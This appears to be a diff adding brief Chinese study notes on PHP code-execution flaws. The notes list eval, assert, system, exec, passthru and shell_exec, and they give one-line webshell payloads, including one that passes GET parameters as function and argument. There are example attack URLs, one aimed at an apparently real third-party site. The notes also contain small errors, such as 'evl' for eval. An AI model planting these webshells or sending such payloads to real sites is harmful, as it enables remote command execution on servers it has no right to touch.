@@ -1,0 +1,15 @@
+代码执行函数：
+	PHP中可以执行代码的函数: 如eval(),assert()将括号中的字符串识别为代码执行
+		例如：<?php evl($_POST[cc123])?> 执行通过POST传递的参数cc123
+			bao.php中一句话内容《?$_GET[a]($_GET[b])?》/《?$a($b)?》
+		访问链接：url/bao.php?a=eval&b=phpinfo()
+	PHP中可以执行cmd代码函数：	
+		1system:执行一个外部应用程序并显示输出结果
+		2exec：执行一个外部应用程序
+		3passthru：执行一个unix系统命令并显示原始输出
+		4shell_exec:执行shell命令并返回输出结果的字符串
+		5“ " ”	运算符，与shell_exec函数的功能相同
+		访问链接：url/bao.php?a=system&b=ipconfig
+代码执行漏洞
+	http：//www.bgdyhd.com/search.php?searchtype=5&tid=&area=phpinfo()
+	
